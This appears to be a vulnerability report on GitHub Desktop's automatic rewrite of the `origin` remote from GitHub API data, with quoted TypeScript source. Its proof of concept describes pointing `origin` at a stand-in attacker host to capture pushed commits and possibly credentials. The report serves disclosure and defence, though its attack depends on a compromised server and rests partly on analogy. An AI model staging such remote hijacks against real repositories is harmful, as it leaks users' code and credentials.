## Analysis

The C4 finding is about a state value (`poolFee`) being mutated without first reconciling/validating the previous state, letting subsequently-computed values silently drift based on trusted-but-stale inputs. The closest structural analog I can find in GitHub Desktop is in the automatic GitHub-repository-refresh path, where the local git `origin` remote URL is silently rewritten based on data returned by the GitHub API, with no user confirmation and no verification that the new destination is actually safe to push to.

### Title
Unconfirmed automatic rewrite of the `origin` remote URL from GitHub API data enables silent push-target hijacking - (File: `app/src/lib/stores/updates/update-remote-url.ts`)

### Summary
`updateRemoteUrl` is invoked automatically (no user interaction) whenever Desktop refreshes a repository's GitHub metadata, and it will call `git remote set-url` on the user's `origin` remote purely based on the `clone_url` field returned by the GitHub/GHES API, as long as a lightweight protocol/heuristic check passes. Unlike the analogous "upstream remote mismatch" flow, which explicitly asks the user via a dialog before changing the `upstream` remote, this path changes `origin` silently.

### Finding Description
`repositoryWithRefreshedGitHubRepository` fetches repo metadata from whatever API endpoint the associated account is configured against and immediately feeds the untrusted response into `updateRemoteUrl`: [1](#0-0) 

`updateRemoteUrl` performs only a structural URL check (`urlMatchesRemote`, which just compares hostname/owner/name) and a same-protocol check before calling `gitStore.setRemoteURL`, which in turn shells out to `git remote set-url`: [2](#0-1) [3](#0-2) [4](#0-3) 

Critically, this rewrite is fully silent — there is no user-facing dialog. Compare this with the deliberate, explicit-consent design used elsewhere in the same codebase for the `upstream` remote, where the same class of change ("the remote we expect and the remote configured differ") is gated behind a confirmation dialog (`UpstreamAlreadyExists`) that shows the user the current vs. expected URL and requires them to click "Update": [5](#0-4) 

No such gate exists for `origin`. The only "safety" checks in `updateRemoteUrl` are:
- `protocolsMatch` — trivially satisfied by any `https://` URL, including an attacker's own domain.
- `remoteUrlUnchanged` — only verifies the *previous* remote still matches the *previously cached* `GitHubRepository.cloneURL`, it does not validate the *new* value in any way.

There is no verification that the new `clone_url` still belongs to the same GitHub host, the same repository ID, or a domain the user has ever consented to.

### Impact Explanation
Because the API response is trusted wholesale, any actor able to influence what `IAPIRepository.clone_url` contains for a repository already tracked by Desktop can cause a silent, unattended rewrite of the user's `origin` remote to a URL of the attacker's choosing (any `https://` URL, not constrained to `github.com`/the original GHES host). The refresh happens automatically in the background (e.g. via `refreshSelectedRepositoryAfterAccountChange` and other periodic/repo-refresh flows), not only when the user explicitly asks for it: [6](#0-5) 

Once `origin` is silently repointed, the user's next `git push` (and any credential-helper authentication attempt tied to that remote) targets the attacker-controlled endpoint instead of the repository the user believes they are pushing to — this is exactly the "silent corruption of what the user commits or pushes" impact class, and depending on the credential helper configuration can also leak push credentials to the new host.

### Likelihood Explanation
This requires an attacker who can affect the `clone_url` field of an `IAPIRepository`/`IAPIFullRepository` object returned to the victim's Desktop client for a repository already linked locally — for example, a compromised or malicious GitHub Enterprise Server instance the user has already added an account for, or any man-in-the-middle/compromise of the API responses served to that account (the code performs no host-pinning of the *new* URL against the account's expected endpoint). This is a realistic, unprivileged-attacker scenario for GHES deployments and does not require local access, admin rights, or prior host compromise of the victim's machine — only control over (or compromise of) the API surface the account talks to.

### Recommendation
- Require explicit user confirmation before rewriting `origin`, mirroring the existing `UpstreamAlreadyExists` dialog UX used for the `upstream` remote.
- Validate that the new `clone_url`'s host matches the account's configured API endpoint host (not just that the protocol matches).
- Consider anchoring trust to a stable repository identifier (e.g. GitHub repo `id`) rather than solely comparing URL strings, so a same-looking-but-different-repo response can't be silently accepted.

### Proof of Concept
1. Victim adds/authenticates a GitHub Enterprise Server account in Desktop and clones a repository from it; `origin` is set to `https://ghes.victim-org.com/team/repo.git`.
2. That GHES instance is later compromised (or a MITM is positioned on it) such that its `/repos/team/repo` API response is modified to return `clone_url: "https://attacker.example.com/team/repo.git"` while keeping the same protocol (`https`).
3. On the next background repository refresh (e.g. triggered on app focus, account refresh, or periodic repo refresh), `repositoryWithRefreshedGitHubRepository` fetches this manipulated object and passes it to `updateRemoteUrl`.
4. `protocolsMatch` is `true` (both `https`), `remoteUrlUnchanged` is `true` (the locally cached `GitHubRepository.cloneURL` still matches the currently configured remote), and `urlsMatch` is `false` (attacker.example.com ≠ ghes.victim-org.com) — so `gitStore.setRemoteURL('origin', 'https://attacker.example.com/team/repo.git')` executes with no prompt.
5. The victim's subsequent `git push` (or Desktop's push action) silently sends commits — and potentially credentials via the git credential helper — to `attacker.example.com`.

export async function updateRemoteUrl(
  gitStore: GitStore,
  gitHubRepository: GitHubRepository,
  apiRepo: IAPIRepository
): Promise<void> {
  // I'm not sure when these early exit conditions would be met. But when they are
  // we don't have enough information to continue so exit early!
  if (gitStore.defaultRemote === null) {
    return
  }

  const remoteUrl = gitStore.defaultRemote.url
  const updatedRemoteUrl = apiRepo.clone_url
  const urlsMatch = urlMatchesRemote(updatedRemoteUrl, gitStore.defaultRemote)

  // Verify that protocol hasn't changed. If it has we don't want
  // to alter the protocol in case they are relying on a specific one.
  // If protocol is null that implies the url is a ssh url
  // of the format git@github.com:octocat/Hello-World.git, which
  // can't be parsed by URL.parse. In this case we assume the user
  // manually configured their remote to use this format and we don't
  // want to change what they've done just to be safe
  const parsedRemoteUrl = URL.parse(remoteUrl)
  const parsedUpdatedRemoteUrl = URL.parse(updatedRemoteUrl)
  const protocolsMatch =
    parsedRemoteUrl.protocol !== null &&
    parsedUpdatedRemoteUrl.protocol !== null &&
    parsedRemoteUrl.protocol === parsedUpdatedRemoteUrl.protocol

  // Check if the default remote url has been manually changed from the
  // clone url retrieved from the GitHub API previously
  const remoteUrlUnchanged =
    gitStore.defaultRemote &&
    urlMatchesRemote(gitHubRepository.cloneURL, gitStore.defaultRemote)

  if (protocolsMatch && remoteUrlUnchanged && !urlsMatch) {
    await gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)
  }
}

export async function setRemoteURL(
  repository: Repository,
  name: string,
  url: string
): Promise<true> {
  await git(['remote', 'set-url', name, url], repository.path, 'setRemoteURL')
  return true
}
